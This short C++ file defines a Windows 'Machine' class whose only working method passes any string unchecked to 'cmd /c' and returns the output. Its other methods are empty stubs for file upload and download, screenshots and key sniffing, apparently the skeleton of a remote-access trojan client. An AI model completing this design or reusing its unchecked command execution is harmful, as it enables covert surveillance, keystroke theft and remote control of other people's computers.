#include <iostream>
#include <array>
#include "machine.hpp"

std::string Machine::RunCommand(std::string command)
{
	std::cout << "Running command: " << command << std::endl;

	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(("cmd /c " + command).c_str(), "r"), _pclose);

	while (fgets(buffer.data(), buffer.size(), pipe.get()))
	{
		result.append(buffer.data()); 
	}
	return result;
}

void Machine::UploadFile(std::string localPath, std::string remotePath)
{
}

void Machine::DownloadFile(std::string remotePath, std::string localPath)
{
}

void Machine::TakeScreenshot()
{
}

void Machine::StartKeySniffing()
{
}

void Machine::StopKeySniffing()
{
}
